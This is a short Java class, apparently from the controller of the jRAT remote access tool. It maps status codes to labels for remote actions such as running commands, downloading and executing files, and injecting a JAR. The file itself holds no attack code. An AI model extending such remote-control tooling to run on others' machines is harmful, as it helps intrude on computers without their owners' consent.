package io.jrat.controller;

import io.jrat.common.Constants;

import java.util.HashMap;
import java.util.Map;

public class Status {

	private static final Map<Integer, String> STATUSES = new HashMap<Integer, String>();

	static {
		STATUSES.put(Constants.STATUS_EXECUTED_FILE, "Executed file");
		STATUSES.put(Constants.STATUS_DOWNLOADING_FILE, "Downloading...");
		STATUSES.put(Constants.STATUS_FAILED_FILE, "Failed downloading");
		STATUSES.put(Constants.STATUS_READY, "Ready");
		STATUSES.put(Constants.STATUS_DISPLAYED_MSGBOX, "Opened messagebox");
		STATUSES.put(Constants.STATUS_FAILED_SHUTDOWN, "Failed shutdown");
		STATUSES.put(Constants.STATUS_STARTING_SHUTDOWN, "Starting shutdown");
		STATUSES.put(Constants.STATUS_RAN_CMD, "Executed command");
		STATUSES.put(Constants.STATUS_MKDIR, "Folder created");
		STATUSES.put(Constants.STATUS_INJECTED, "Injected JAR");
	}

	public static String getStatusFromID(int i) {
		return STATUSES.get(i);
	}

}
